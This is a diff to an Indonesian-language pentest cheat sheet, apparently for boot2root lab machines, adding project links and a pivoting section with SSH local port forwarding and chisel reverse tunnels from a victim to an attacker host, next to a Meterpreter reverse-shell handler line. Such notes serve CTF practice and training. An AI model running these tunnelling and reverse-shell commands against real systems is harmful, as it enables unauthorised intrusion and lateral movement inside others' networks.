@@ -2,6 +2,10 @@
 
 ![img](https://raw.githubusercontent.com/Tomba-Hopkins/Warung-Sidi/refs/heads/main/img/menu/3.jpg)
 
+# Links
+- dah buat versi UI nya 
+- github: https://github.com/zams-putra/b2r-framework
+- webnya: https://b2r-framework.vercel.app/
 
 # Foothold
 
@@ -193,6 +197,33 @@ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse
 
 
 # Privilege Escalation
+
+## Pivoting
+- ini masih copy dari yg framework linux ku sih hhh, jadi kali ae sama
+- cek internal service yg jalan, keknya ada beda dikit ama linux deh
+```ps1
+netstat -ano | findstr "LISTENING"
+```
+- ssh port forwarding, ini dipake kalo tau passwordnya atau ga kalo ada id_rsa 
+```bash
+ssh -L [mau_taruh_diport_mana]:127.0.0.1:[mau_run_port_internal_service_mana] [username_target]@[ip_target]
+
+ssh -L 6060:127.0.0.1:80 cave_man@10.10.10.10 # nanti buka 127.0.0.1:6060 di browsermu jadi port 80 nya mereka
+# also kalau ada internal service di 4444, cek di browser juga possible ada
+```
+- udah sih, keknya kalau dah connect dia bisa cek2 internal service port lain
+- chisel port forwarding
+```ps1
+# di mesin attacker
+./chisel server -p [mau_port_mana] --reverse
+./chisel server -p 8000 --reverse
+
+# di mesin victim, make sure upload dulu ke mesin target, pake wget kah pake apa aja bebas
+# case misal yg jalan internal service port 8888 sama 5000, kalau chisel kudu 2 cuy
+.\chisel.exe client [ip_attacker]:[port_reverse] R:[internal_service1]:127.0.0.1:[internal_service1] R:[internal_service2]:127.0.0.1:[internal_service2]
+.\chisel.exe client 10.10.10.10:8000 R:5000:127.0.0.1:5000 R:8888:127.0.0.1:8888
+# lansgung buka aja port 5000 di browser sama port 8888, 127.0.0.1:8000 127.0.0.1:5000
+```
 
 ## Check Privilege group etc
 ```bash
